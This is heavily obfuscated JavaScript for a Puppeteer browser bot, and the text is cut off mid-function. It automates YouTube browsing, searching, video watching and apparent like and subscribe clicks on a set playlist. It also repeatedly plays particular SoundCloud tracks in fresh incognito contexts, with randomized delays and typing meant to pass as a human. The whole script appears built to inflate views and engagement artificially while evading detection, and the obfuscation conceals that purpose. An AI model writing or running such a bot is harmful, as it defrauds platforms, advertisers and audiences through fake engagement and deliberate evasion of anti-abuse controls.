const Z = d,
  X = b,
  W = c;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1a * 0xd5 + 0x23c0 + -0x3962);
    let h = e[f];
    if (c['CdidmU'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x7 * 0x3f8 + 0x2 * -0xf0a + 0x2 * 0x1cee, r, s, t = -0x10c * -0x15 + 0xc4c + -0x2248; s = m['charAt'](t++); ~s && (r = q % (0x1699 * -0x1 + -0x18e * -0x13 + -0xc5 * 0x9) ? r * (-0x1 * -0x1522 + 0x1 * -0x23aa + -0x4 * -0x3b2) + s : s, q++ % (0x26c5 * -0x1 + 0x1ce7 + -0x73 * -0x16)) ? o += String['fromCharCode'](0xba0 + 0x58c * -0x3 + -0x3 * -0x201 & r >> (-(0xddd * 0x2 + -0x20ca + 0x512 * 0x1) * q & 0x7ef * 0x3 + -0x7 * 0x1a8 + -0xc2f)) : -0xbe4 + 0x1cd * 0x1 + 0xa17) {
          s = n['indexOf'](s);
        }
        for (let u = -0x4a3 * -0x8 + 0x7 * -0x37a + -0xcc2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x3 * 0x5c1 + 0x1 * -0x29b + -0x1 * 0xe98))['slice'](-(-0x5f * 0x19 + -0x12ce + 0x2f * 0x99));
        }
        return decodeURIComponent(p);
      };
      c['AApLNH'] = i, b = arguments, c['CdidmU'] = !![];
    }
    const j = e[0x143d + -0x26d8 + 0x129b],
      k = f + j,
      l = b[k];
    return !l ? (h = c['AApLNH'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x168a + 0x133 * -0x1 + 0x3 * 0x7ea))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1c9e + -0x1b05 * -0x1 + -0x1 * -0x199), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * -0xaa63 + 0xd09 + 0xc * -0x585 + (-0x983 * -0xc + -0x1 * 0x358d + -0x1ff) * random()) : await standardWaitForNetIdle(f), await wait(-0x5 * -0x743 + -0x2333 * -0x1 + 0x33fa * -0x1 + (0x125 * -0xe + 0x4d21 + 0x273 * -0x9) * random()), 0x269c + -0x988 + -0x33b * 0x9;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1a * 0xd5 + 0x23c0 + -0x3962);
    let h = e[f];
    if (b['xSRZtD'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x7 * 0x3f8 + 0x2 * -0xf0a + 0x2 * 0x1cee, s, t, u = -0x10c * -0x15 + 0xc4c + -0x2248; t = n['charAt'](u++); ~t && (s = r % (0x1699 * -0x1 + -0x18e * -0x13 + -0xc5 * 0x9) ? s * (-0x1 * -0x1522 + 0x1 * -0x23aa + -0x4 * -0x3b2) + t : t, r++ % (0x26c5 * -0x1 + 0x1ce7 + -0x73 * -0x16)) ? p += String['fromCharCode'](0xba0 + 0x58c * -0x3 + -0x3 * -0x201 & s >> (-(0xddd * 0x2 + -0x20ca + 0x512 * 0x1) * r & 0x7ef * 0x3 + -0x7 * 0x1a8 + -0xc2f)) : -0xbe4 + 0x1cd * 0x1 + 0xa17) {
          t = o['indexOf'](t);
        }
        for (let v = -0x4a3 * -0x8 + 0x7 * -0x37a + -0xcc2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x3 * 0x5c1 + 0x1 * -0x29b + -0x1 * 0xe98))['slice'](-(-0x5f * 0x19 + -0x12ce + 0x2f * 0x99));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x143d + -0x26d8 + 0x129b,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x455 * -0x5 + 0x6d * -0x17 + -0xbde; u < 0x5af * 0x3 + 0x129e * 0x1 + -0x22ab; u++) {
          p[u] = u;
        }
        for (u = 0x14e5 * 0x1 + -0x1 * 0xf0d + 0x22 * -0x2c; u < 0x2 * -0x1333 + -0x5cd + -0x7 * -0x675; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xf9 * 0xd + 0x220e + -0x2db3 * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xa9 * 0x33 + -0x437 * -0x1 + 0x104 * 0x1d, q = -0x1 * -0x858 + 0x26c3 * -0x1 + 0x1e6b;
        for (let v = -0x207 * -0x1 + 0x1 * 0x236c + -0x1 * 0x2573; v < n['length']; v++) {
          u = (u + (-0x1523 + 0x1b87 + -0xf * 0x6d)) % (0x2 * -0xe7f + 0x1 * -0x26ae + 0x44ac), q = (q + p[u]) % (-0x25e8 + 0xb8d * -0x2 + 0x3e02), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1e5b + 0x1 * 0x61b + -0x10 * -0x194)]);
        }
        return t;
      };
      b['vgNzmu'] = m, c = arguments, b['xSRZtD'] = !![];
    }
    const j = e[0x1308 + -0x3 * 0xc75 + 0x1257],
      k = f + j,
      l = c[k];
    return !l ? (b['lKFjRw'] === undefined && (b['lKFjRw'] = !![]), h = b['vgNzmu'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1a * 0xd5 + 0x23c0 + -0x3962);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardWaitForNetIdle(f) {
  return await wait(0x2e9 + -0xc0 * -0x2c + -0x257 * 0x7), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xe36 + -0x1 * -0x853 + 0x8 * -0x2d1;
}
async function randomWait() {
  return await wait(-0x2 * -0x262 + 0x873 + 0x651 + (0xbc5 + 0x1f * -0xa7 + -0x1bfc * -0x1) * random()), -0x1ca7 + -0x17 * 0xd9 + -0x24b * -0x15;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + R(0x9) + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x9d + 0x17 * 0xfb + 0xb95 * -0x2, 0x26bc + -0x1 * -0x24dd + 0x25c9 * -0x2), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x79 * 0xf6 + -0x7d9a + 0xf3b4) * getRandomInt(0x2572 + -0x2 * -0x298 + 0x554 * -0x8, 0x1a1b + -0xe3e * -0x2 + -0x3692), h)), 0x437 + -0x193a * -0x1 + 0x1d7 * -0x10;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * -0x858 + 0x26c3 * -0x1 + 0x1e6b;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x207 * -0x1 + 0x1 * 0x236c + -0x1 * 0x2572]['split']('\x20');
    for (let k = -0x1523 + 0x1b87 + -0x4 * 0x199; k < i['length']; k += 0x2 * -0xe7f + 0x1 * -0x26ae + 0x43ae)
      j += i[k] * h[i[k + (-0x25e8 + 0xb8d * -0x2 + 0x3d03)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1e5b + 0x1 * 0x61b + -0xd * -0x1de)['map'](l => Array['from'](l['children']))['flat'](0x1308 + -0x3 * 0xc75 + 0x1258)['map'](l => l['childNodes'][-0x853 * -0x1 + -0x2476 + 0x1c24]['childNodes'][0x8a5 + -0x75 + -0x83 * 0x10]['childNodes'][0x1ee6 + -0x12af + 0x209 * -0x6]['childNodes'][0xb * 0x1c9 + -0x1b56 + 0x7b3]['childNodes'][-0x522 + -0xf00 + -0x1 * -0x1423]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1bae + 0xc2f + -0x23f5, -0x1023 + 0x1 * 0x1f75 + 0x436)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1 * -0x4b29 + 0xb * 0xaa4 + -0x859d);
  const h = await getMaxTime(f),
    i = Math['min']((0xb9cb + 0x3d1 * 0x63 + -0x1493e) * getRandomInt(0x1 * 0x1d3 + -0x8f6 + 0x725 * 0x1, -0x2391 + 0xc97 + -0x16ff * -0x1), h);
  return await wait(i), 0x1fdb + 0x3 * 0x893 + 0x33 * -0x121;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x17 * 0xb2 + -0x1 * 0x83b + -0x7c3]['children'][0x841 * 0x1 + -0x19e2 + 0x11a1]['children'][-0x15ec + -0x963 + 0x1f4f]['children'][-0x103f + -0xfec + -0xab9 * -0x3]['children'][-0x145d + 0x1155 + -0x308 * -0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1 * -0xaf9 + -0x1268 + -0xeb1 * -0x2;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x7cd * -0x1 + -0x25bd + 0x2dee + (-0x1 * 0x1f5b + 0x31 * -0x3d + -0x159d * -0x2) * random()
  }), await wait(0xc7 * 0x17 + 0x1f9d + -0x982 * 0x5 + (0x189d * 0x1 + 0x2 * 0xcb8 + -0x30e1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x57a + 0x11b * -0x6 + -0x40a * -0x3]['childNodes'][0x113d * 0x2 + -0x13b8 + 0x3 * -0x4eb]['childNodes'][-0x1314 + -0x7d2 + -0x61 * -0x47]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xd4 * 0x2 + 0x15e4 + 0x1787 * -0x1]['childNodes'][-0xd2 * -0x25 + 0x6 * 0x39d + -0x3408]['childNodes'][-0x2642 * 0x1 + -0x108e + 0x36d2]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1cbd + 0x15ee + 0x32aa * -0x1),
          r = 0x2 * 0xfb + 0x1dda + -0x1fd0;
        for (let u = -0x1 * 0x901 + 0xa6d * 0x1 + -0x1c * 0xd; u < q['length']; u += -0x1313 + -0x4db + 0x4 * 0x5fc)
          r += q[u] * k[q[u + (-0x1da7 + 0x1de5 + -0x3d)]];
        return r;
      }(n);
  });
  await wait((-0x739 + -0xe5 * 0x47 + 0x8154) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x5 * 0x2ff5 + 0x1cb8f + -0x1d0f8) * getRandomInt(0x3 * 0x719 + 0x1260 + -0x27aa, -0x1607 + -0x1b * -0xac + 0x3ed), h + (-0x1b67 + -0x3 * 0xccb + 0x1554 * 0x4));
  return await wait(i), 0xc * -0x18b + 0x1688 + -0x403 * 0x1;
}
async function keyWatch(f) {
  const S = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0x158f + 0x1 * 0x1845 + -0x1c * 0x1a3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + S(0x10) + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x20fb + 0x1 * -0x21f1 + 0xcae + (0x1 * 0xfd9 + -0x2101 + 0x1510) * Math['random']());
    });
  }, -0x16c7 + 0x369a + -0x47b);
  await wait(0xb * 0x3274 + 0xb * 0x734b + -0x28b55);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1c485 + 0x4f * 0x89 + -0x1046c) * getRandomInt(0x8e5 + 0xa * 0x6b + -0xd0f, 0x18c + 0x1b5 + -0x328)), clearInterval(h), -0x1d16 + 0x653 * -0x1 + 0x236a;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x8cf + 0xe98 + -0x5c9;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1e9d + -0x11eb * -0x2 + -0x4 * 0x14e;
    await randomWait();
  }
  return 0xf09 + -0x8 * 0x61 + -0xc00;
}

function fetchRandomSC() {
  return Math['random']() <= -0xc29 + -0x3 * 0x955 + 0x2828 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x5fc + -0x1 * -0x2146 + 0x2 * -0x13a1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1ef6 + 0x39 * -0x85 + -0x9 * -0x6bb + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x28d * 0x1 + -0x190b * 0x1 + 0x1b98;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x14af + -0x1 * -0xa3e5 + -0x8cc + getRandomInt(-0x354e * 0x1 + -0x6d70 + -0xdd56 * -0x1, -0x7 * -0x763 + 0xd30d + -0x9192));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xdc2 + -0x1 * -0x1e71 + 0x262 * -0x7), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x21a3 + 0xb21 + 0x56 * 0x43;
      if (await s[T(0xc)](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x6d * 0x4d + 0x1f73 + -0x403c, 0x21db + 0xa04 * -0x1 + 0x17a5 * -0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x35 * 0xb5 + 0x781 + 0x1 * -0x252a + floor((-0x3 * -0xaaf + 0x4 * 0x86 + -0x1 * 0x1e3d) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x9744f65e + -0xc50e472 * -0xb + 0x8fcb2578),
          0x2a362e * -0x5 + 0xe287f3 + 0x35 * 0x21f87,
          -0xe39d + -0x424b * 0x2 + -0x1e833 * -0x1,
          -0x1724 * 0x1 + -0xcd0 + -0x2 * -0x123a
        ], y = [
          -0xe7 * 0x15 + -0x314 + 0x7 * 0x329,
          0x25b5 + -0x482 * -0x6 + -0x40b1,
          -0x4 * -0x1f + 0x54e + -0xb * 0x86,
          -0x1bb6 + -0x1e5a * 0x1 + 0x3a10
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x19 * -0x2b + -0x2064 + 0x2498)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x896 * 0x4 + -0x31 * -0x31 + 0x1 * 0x18f7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1ae0 + -0x10d2 + -0xa0e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x17a1 + -0xd * -0x2ad + 0x2 * -0x1d35] = A[-0x8e7 * -0x2 + 0x1911 + 0x3 * -0xe45] = A[-0x1 * -0x21e6 + 0xb3 * -0x9 + 0x1 * -0x1b9a] = A[-0x1 * 0x4ab + 0xbb9 + -0x1 * 0x70c] = A[-0x19db + -0x1acd + -0x8b * -0x61] = A[-0x57e * 0x7 + 0x2b * -0x53 + 0x3467] = A[0x2299 + 0xae * 0x7 + -0x2756] = A[0x36e + 0xf8b + -0x12f3] = A[0x240d * -0x1 + 0x1 * -0x10c7 + -0x34db * -0x1] = A[-0x301 * 0x2 + 0x1 * 0xb + 0x5 * 0x133] = A[0xc * -0x70 + -0x742 + 0xc8b] = A[0x206f + 0xd91 + 0xf52 * -0x3] = A[-0x25f + -0x14d3 + 0x173d] = A[-0x4 * 0x435 + 0x58e + 0xb52] = A[0x93e + 0x253a + -0x11 * 0x2bb] = A[0x23a7 + 0xa07 + 0x49 * -0xa0] = A[-0x2023 * -0x1 + 0x4 * 0x535 + -0x2 * 0x1a74] = 0x1 * -0x13eb + -0x1 * -0x86e + 0xb7d, this['blocks'] = A) : this['blocks'] = [
                0x4cc + -0x1 * -0x1d7b + 0x3cf * -0x9,
                -0x109f * -0x2 + -0x3bd + 0x1 * -0x1d81,
                0x2 * -0x38a + 0x17af * -0x1 + 0x1ec3 * 0x1,
                0x1525 * -0x1 + 0x22b5 + -0xd90,
                -0xe * -0x237 + -0x48b * 0x1 + -0x1a77,
                -0x2 * 0xa79 + 0x194b + -0x459,
                -0xa0 * -0x33 + 0x1d12 * -0x1 + -0x2ce,
                0x6f7 * -0x5 + -0x1 * -0x283 + -0x58 * -0x5e,
                -0x226f + -0xd3a * -0x2 + 0x9 * 0xe3,
                -0x3 * -0x273 + -0x1f * -0x19 + 0x14c * -0x8,
                0xd87 * -0x1 + 0x97e + 0x409,
                0x86 * 0x29 + 0x71d + -0x1c93,
                -0x1 * -0x6c2 + -0xd3e + 0x67c,
                0x20 * 0x5a + 0x21d5 + -0x3 * 0xf07,
                -0xea3 + 0x3a6 * 0x9 + -0x1 * 0x1233,
                0xc9 * -0x1 + -0x127c + -0x1 * -0x1345,
                0x289 * 0x2 + -0x2b * 0x67 + 0xc3b
              ], this['h0'] = 0xf6a1 * 0x9ebc + -0x97e * 0xb8a8d + 0x3be5cd2b, this['h1'] = -0x156745 * 0xb9e + 0x1d5742a * 0x97 + 0x6d2f687 * 0x1f, this['h2'] = -0xb * 0x198377b4 + -0x2 * 0x49a5124b + -0x2 * -0x122559328, this['h3'] = -0x5036b06 + 0xdb6ea7b + 0x1 * 0x77ed501, this['h4'] = 0x26a4f61 + 0x1a1c3699 + -0xa * -0x10bad5ff, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xda * -0x2 + -0xd8d * 0x2 + 0x2 * 0xe67, this['finalized'] = this['hashed'] = -0xece + -0x1 * 0xfb3 + 0x13 * 0x19b, this['first'] = 0x11d3 + 0x744 + -0xa9 * 0x26;
            }
            ['update'](J) {
              const U = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x14c3 + -0x31d * 0x7 + 0x4 * 0x42, O = J['length'] || -0x1 * 0x1a5a + 0x3ac + 0x2 * 0xb57, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x16e + 0x23c4 + -0x2256 * 0x1, P[-0x13d4 + 0x86 * -0x34 + 0x2 * 0x1786] = this['block'], P[-0x129 + -0x990 + 0xac9] = P[0x385 + -0x1 * 0x115f + 0xddb] = P[0x1554 + -0x191a + 0x3c8] = P[-0x839 + -0x7 * -0x33e + 0x6 * -0x269] = P[-0x1 * 0x17c7 + 0x1 * -0xf1a + 0x26e5 * 0x1] = P[-0x2 * 0x22c + -0x1a66 + 0xf * 0x20d] = P[-0x2a9 * -0x7 + 0x266c + -0x1 * 0x3905] = P[-0xa * -0x195 + -0x59 * -0xa + -0x1345 * 0x1] = P[-0x6d * 0x55 + 0x838 + 0x1c01] = P[-0x25fd + 0xf4e * -0x1 + 0x3554] = P[-0x1efa + -0xdb9 + 0x371 * 0xd] = P[0x9f * 0x6 + 0x1354 + -0x2b * 0x89] = P[0x771 + -0x1 * -0xd24 + -0x1489] = P[0x1d5b + 0x1bd9 + -0x130d * 0x3] = P[0x252e + -0x1de3 + -0x73d] = P[-0x1 * 0x3c1 + -0x21df + 0x25af * 0x1] = 0xc27 + 0xf4 + -0xd1b), K) {
                    for (N = this['start']; M < O && N < 0x211c * -0x1 + -0x1 * 0x116c + -0x7d * -0x68; ++M)
                      P[N >> -0x955 + 0x5c + 0x8fb] |= J[M] << y[0x122 + 0x1 * 0xf09 + -0x1028 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xbf * -0x25 + -0x2118 + -0x3cf3 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0xc * -0x13 + -0xe4b + 0x49 * 0x37 ? P[N >> 0x1e99 + 0x1511 + -0x89c * 0x6] |= L << y[-0x2 * 0xcb3 + -0xb63 * 0x1 + 0x3ae * 0xa & N++] : L < -0x681 + 0x11b9 * -0x1 + 0x203a ? (P[N >> -0x1d5f + 0x1a62 * 0x1 + 0x3b * 0xd] |= (0x1 * -0xcaf + 0x1 * 0xcec + 0x83 | L >> -0xe9a + -0x1 * -0x1f5f + 0x10bf * -0x1) << y[0x23c * -0x6 + -0x239e + 0x3109 & N++], P[N >> -0x43 * 0x87 + -0x1 * -0x26b + 0x20ec] |= (-0x87 * -0x25 + -0x2 * -0x47d + -0x5 * 0x599 | 0x272 + 0xc29 + -0xe5c & L) << y[-0x138a + 0xa78 + -0x1d1 * -0x5 & N++]) : L < -0x895c * 0x2 + 0x1998b * -0x1 + 0x38443 || L >= 0x4190 + 0x1941f + 0x1 * -0xf5af ? (P[N >> 0x17fb * -0x1 + 0x4 * 0x101 + -0x1 * -0x13f9] |= (0x74 * -0x41 + 0x6 * 0x580 + -0x4 * 0xab | L >> -0xcfe + -0x17b * -0xe + -0x7b0) << y[0x192b + -0xa4 * 0x2f + -0x27a * -0x2 & N++], P[N >> 0x1daa + 0x404 + -0x10d6 * 0x2] |= (-0x1d8f + -0x21ec + 0x5d1 * 0xb | L >> 0x185b + -0x53 * 0x5 + 0x16b6 * -0x1 & -0xa14 + 0x142b + -0x9d8) << y[-0x53c + 0x5b7 + 0x3 * -0x28 & N++], P[N >> 0x10 * 0x28 + -0xb * -0x40 + 0x2 * -0x29f] |= (0x50 * -0x49 + -0x1910 + 0x3060 | -0x31 * -0x3 + -0x3c9 * 0x3 + 0xb07 * 0x1 & L) << y[0x23d9 + -0x1e8 + 0x56 * -0x65 & N++]) : (L = -0x19610 + 0x4c3 * 0x53 + 0x10ad7 + ((0x3a * 0x3b + -0x22e3 + 0x1984 & L) << -0x1364 + -0x13f5 * 0x1 + 0x1 * 0x2763 | -0x167c + -0x4eb + -0x1f66 * -0x1 & J['charCodeAt'](++M)), P[N >> 0x24ba + 0xca4 + -0xa2 * 0x4e] |= (0x214 * 0x8 + 0x1648 + -0x25f8 | L >> 0x140e + -0x93b + -0xac1) << y[-0x1 * 0x1c21 + -0xf * -0x271 + 0x87b * -0x1 & N++], P[N >> 0x5cc + -0x132d + 0xd63] |= (-0x167 * -0xe + -0x946 * 0x2 + -0x96 | L >> -0xf74 + -0x138f * -0x1 + -0x40f * 0x1 & -0x16f2 + 0x18d6 + -0x1a5) << y[0xc81 + 0xa3d * -0x3 + 0x3a5 * 0x5 & N++], P[N >> -0x316 + 0x1d42 + 0x11 * -0x18a] |= (-0x2669 + 0xee7 + 0x1802 | L >> -0x195 * 0x9 + -0x6 * 0x45b + 0x2865 & -0x85a * -0x3 + -0x56e + 